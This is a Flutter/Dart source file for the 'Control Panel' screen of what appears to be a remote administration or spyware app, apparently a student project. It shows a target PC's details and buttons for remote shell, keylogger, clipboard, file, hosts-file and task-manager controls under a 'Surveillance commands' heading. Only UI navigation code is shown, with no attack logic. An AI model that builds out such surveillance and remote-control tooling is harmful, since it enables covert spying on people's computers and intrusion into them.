import 'package:flutter/cupertino.dart';
import 'package:flutter/material.dart';
import 'package:font_awesome_flutter/font_awesome_flutter.dart';
import 'package:get/get.dart';
import 'package:get/get_rx/src/rx_typedefs/rx_typedefs.dart';
import 'package:inferno_core_fyp/res/constants.dart';
import 'package:inferno_core_fyp/res/helper_extensions.dart';
import 'package:inferno_core_fyp/view/controls/accounts.dart';
import 'package:inferno_core_fyp/view/controls/clipboard.dart';
import 'package:inferno_core_fyp/view/controls/host_file.dart';
import 'package:inferno_core_fyp/view/controls/keylogger.dart';
import 'package:inferno_core_fyp/view/controls/network.dart';
import 'package:inferno_core_fyp/view/controls/pc.dart';
import 'package:inferno_core_fyp/view/controls/shell.dart';
import 'package:inferno_core_fyp/view/controls/sys_files.dart';
import 'package:inferno_core_fyp/view/controls/task_manager.dart';

import '../res/widgets/general widgets/dotted_strings.dart';
import '../res/widgets/general widgets/my_text.dart';
import 'controls/miscellaneous.dart';
import 'controls/programs.dart';

class ControlPanel extends StatelessWidget {
  const ControlPanel({Key? key}) : super(key: key);

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(title: const Text("Control Panel"), centerTitle: true),
      body: SingleChildScrollView(
        child: Padding(
          padding: const EdgeInsets.all(kDefaultPadding - 3),
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              Container(
                padding: const EdgeInsets.all(10),
                width: double.infinity,
                decoration: BoxDecoration(
                  borderRadius: BorderRadius.circular(10),
                  border: Border.all(color: whiteColor, width: 2),
                ),
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    const Center(
                      child: MyText(
                        "Zain",
                        fontWeight: FontWeight.bold,
                        fontSize: 22,
                        decoration: TextDecoration.underline,
                      ),
                    ),
                    4.ph,
                    dotsSeparatedStrings(t1: "Operating System", t2: "Window"),
                    dotsSeparatedStrings(t1: "Uptime", t2: "10 mints"),
                    dotsSeparatedStrings(t1: "Ram", t2: "4 gbs"),
                  ],
                ),
              ),
              CommandSection(
                sectionName: "System commands",
                items: [
                  CommandItem(
                    text: "PC",
                    icon: Icons.desktop_windows_outlined,
                    iconSize: 27,
                    onTap: () {
                      Get.to(() => const PC());
                    },
                  ),
                  CommandItem(
                    text: "Account",
                    icon: FontAwesomeIcons.circleUser,
                    onTap: () {
                      Get.to(() => const Accounts());
                    },
                  ),
                  CommandItem(
                    text: "Firewall",
                    icon: Icons.security,
                    onTap: () {},
                  ),
                  CommandItem(
                    text: "Hardware",
                    icon: Icons.hardware,
                    iconSize: 29,
                    onTap: () {},
                  ),
                  CommandItem(
                    text: "Programs",
                    icon: Icons.computer,
                    onTap: () {
                      Get.to(() => const Programs());
                    },
                  ),
                  CommandItem(
                    text: "Task Manager",
                    icon: Icons.task,
                    onTap: () {
                      Get.to(() => const TaskManagerPage());
                    },
                  ),
                  CommandItem(
                    text: "HostFile",
                    icon: Icons.file_copy,
                    onTap: () {
                      Get.to(() => const HostFilePage());
                    },
                  ),
                ],
              ),
              CommandSection(
                sectionName: "Surveillance commands",
                items: [
                  CommandItem(
                    text: "Keylogger",
                    icon: FontAwesomeIcons.keyboard,
                    iconSize: 27,
                    onTap: () {
                      Get.to(() => const KeyLogger());
                    },
                  ),
                  CommandItem(
                    text: "Screen",
                    icon: Icons.screenshot_monitor_outlined,
                    iconSize: 30,
                    onTap: () {},
                  ),
                  CommandItem(
                    text: "Network",
                    icon: Icons.network_wifi,
                    iconSize: 30,
                    onTap: () {
                      Get.to(() => const Network());
                    },
                  ),
                ],
              ),
              CommandSection(
                sectionName: "Other commands",
                items: [
                  CommandItem(
                    text: "Shell",
                    icon: FontAwesomeIcons.solidFileCode,
                    onTap: () {
                      Get.to(() => const Shell());
                    },
                  ),
                  CommandItem(
                    text: "Files",
                    icon: CupertinoIcons.folder_fill,
                    onTap: () {
                      Get.to(() => SystemFiles());
                    },
                  ),
                  CommandItem(
                    text: "Clipboard",
                    icon: FontAwesomeIcons.clipboard,
                    onTap: () {
                      Get.to(() => const ClipboardPage());
                    },
                  ),
                  CommandItem(
                    text: "Miscellaneous",
                    icon: Icons.miscellaneous_services,
                    onTap: () {
                      Get.to(() => const Miscellaneous());
                    },
                  ),
                ],
              ),
            ],
          ),
        ),
      ),
    );
  }
}

class CommandSection extends StatelessWidget {
  final String sectionName;
  final List<CommandItem> items;

  const CommandSection({
    super.key,
    required this.sectionName,
    required this.items,
  });

  @override
  Widget build(BuildContext context) {
    return Column(
      crossAxisAlignment: CrossAxisAlignment.start,
      children: [
        2.ph,
        const Divider(),
        2.ph,
        MyText(
          sectionName,
          fontSize: 15.5,
          fontWeight: FontWeight.bold,
        ),
        20.ph,
        GridView.builder(
          shrinkWrap: true,
          physics: const NeverScrollableScrollPhysics(),
          gridDelegate: const SliverGridDelegateWithMaxCrossAxisExtent(
            maxCrossAxisExtent: 130,
            mainAxisExtent: 78,
            childAspectRatio: 1.25,
          ),
          itemCount: items.length,
          itemBuilder: (context, index) {
            return items[index];
          },
        ),
      ],
    );
  }
}

class CommandItem extends StatelessWidget {
  final String text;
  final IconData icon;
  final Callback onTap;
  final double iconSize;

  const CommandItem({
    super.key,
    required this.text,
    required this.icon,
    required this.onTap,
    this.iconSize = 28,
  });

  @override
  Widget build(BuildContext context) {
    return InkWell(
      onTap: onTap,
      child: Column(
        children: [
          Icon(icon, size: iconSize),
          8.ph,
          Expanded(child: MyText(text, textAlign: TextAlign.center)),
        ],
      ),
    );
  }
}

// Expanded(
// child: GridView.builder(
// gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
// crossAxisCount: 2,
// crossAxisSpacing: 13, // Horizontal space between items
// mainAxisSpacing: 13, // Vertical space between items
// childAspectRatio: 2.3,
// ),
// itemCount: commands.length, // Number of items in the grid
// physics: const BouncingScrollPhysics(),
// itemBuilder: (BuildContext context, int index) {
// return Container(
// padding: const EdgeInsets.all(6),
// decoration: BoxDecoration(
// borderRadius: BorderRadius.circular(10),
// border: Border.all(color: whiteColor, width: 2),
// ),
// child: Center(
// child: Text(
// commands[index],
// textAlign: TextAlign.center,
// style: const TextStyle(
// fontWeight: FontWeight.bold,
// fontSize: 19,
// ),
// ),
// ),
// );
// },
// ),
// ),
